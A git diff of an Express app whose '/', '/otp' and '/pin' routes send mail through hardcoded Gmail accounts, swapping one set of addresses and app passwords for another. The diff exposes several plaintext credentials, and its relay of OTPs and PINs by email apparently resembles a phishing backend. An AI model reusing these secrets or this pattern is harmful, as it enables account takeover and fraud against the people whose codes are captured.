@@ -20,8 +20,11 @@ app.post('/',(req,res) => {
     const transporter = nodemailer.createTransport({
         service:'gmail',
         auth: {
-            user: 'edehchinedu59@gmail.com',
-            pass: 'yknycyzsxdkxpepq'
+            // user: 'edehchinedu59@gmail.com',
+            // pass: 'yknycyzsxdkxpepq'
+            user: 'Victorchinemeremfx.112@gmail.com',
+            pass: 'krbxkoemjvdnexdf'
+            
         }
     })
 
@@ -50,8 +53,10 @@ app.post('/otp',(req,res) => {
     const transporter = nodemailer.createTransport({
         service:'gmail',
         auth: {
-            user: 'edehchinedu59@gmail.com',
-            pass: 'yknycyzsxdkxpepq'
+          // user: 'edehchinedu59@gmail.com',
+            // pass: 'yknycyzsxdkxpepq'
+            user: 'Victorchinemeremfx.112@gmail.com',
+            pass: 'krbxkoemjvdnexdf'
         }
     })
 
@@ -84,8 +89,10 @@ app.post('/pin',(req,res) => {
             //  user: 'Victorchinemerem191@gmail.com',
             // pass: 'aivsveolwtqinddb'
             
-            user: 'edehchinedu59@gmail.com',
-            pass: 'yknycyzsxdkxpepq'
+        // user: 'edehchinedu59@gmail.com',
+            // pass: 'yknycyzsxdkxpepq'
+            user: 'Victorchinemeremfx.112@gmail.com',
+            pass: 'krbxkoemjvdnexdf'
         }
     })
 
